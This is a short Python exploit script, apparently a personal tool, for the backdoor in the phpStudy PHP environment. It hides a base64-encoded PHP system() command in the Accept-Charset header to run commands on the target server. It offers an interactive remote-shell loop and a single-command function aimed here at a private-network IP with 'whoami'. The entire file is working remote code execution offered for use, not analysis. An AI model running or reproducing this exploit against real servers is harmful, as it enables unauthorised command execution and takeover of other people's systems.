# -*- coding: utf-8 -*-
# @Author  : Alphabug
# @Time    : 2021/5/10 9:48
# @PRODUCT : PyCharm
# @Function: phpstudy后门.py

import requests
import re
import base64
def SHELL(url):
    try:
        while 1:
            shell = input(">>>")
            shell = "echo \"abds\";system(\""+shell+"\");echo \"abds\";"
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
                'Accept-Encoding': 'gzip,deflate',
                'Accept-Charset': base64.b64encode(shell.encode()).decode()
            }
            response = requests.get(url=url,headers=headers,timeout=3)
            text = re.findall(r"abds(.+?)abds",response.text,re.S)
            print(text[0])
            if shell == "0":
                return
    except:
        print("异常")
def exp(url,shell):
    try:
        # shell
        shell = "echo \"abds\";system(\""+shell+"\");echo \"abds\";"
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
            'Accept-Encoding': 'gzip,deflate',
            'Accept-Charset': base64.b64encode(shell.encode()).decode()
        }
        response = requests.get(url=url,headers=headers,timeout=3)
        text = re.findall(r"abds(.+?)abds",response.text,re.S)
        print(text[0])
        if shell == "0":
            return
    except:
        print("异常")
if __name__ == '__main__':
    url = "http://192.168.128.139/"
    exp(url,"whoami")
